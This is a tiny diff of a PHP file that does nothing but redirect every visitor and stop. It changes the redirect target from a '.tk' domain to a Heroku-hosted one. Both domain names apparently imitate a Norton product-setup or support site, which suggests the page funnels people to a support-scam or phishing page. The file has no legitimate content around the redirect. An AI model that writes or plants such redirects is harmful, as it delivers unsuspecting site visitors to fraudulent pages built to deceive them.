@@ -1,5 +1,5 @@
 <?php
-header("Location: https://setup-your-keyyt.tk/nor/");
+header("Location: https://nortactt.herokuapp.com/");
 die();
 ?>
 
